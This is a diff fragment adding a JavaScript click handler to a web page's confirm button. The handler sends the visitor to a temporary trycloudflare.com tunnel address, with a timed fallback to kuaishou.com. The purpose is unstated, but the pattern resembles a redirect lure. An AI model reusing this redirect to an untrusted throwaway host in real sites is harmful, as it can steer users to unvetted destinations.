+            const confirmBtn = document.querySelector('.confirm-btn');
+            confirmBtn.addEventListener('click', function(e) {
+                // 尝试多种跳转方式
+                window.open('https://star-hotel-pendant-propecia.trycloudflare.com/', '_self');
+                // 如果第一种方式失败，尝试第二种
+                setTimeout(function() {
+                    window.location.href = 'https://www.kuaishou.com';
+                }, 100);
             });
         });
     </script>
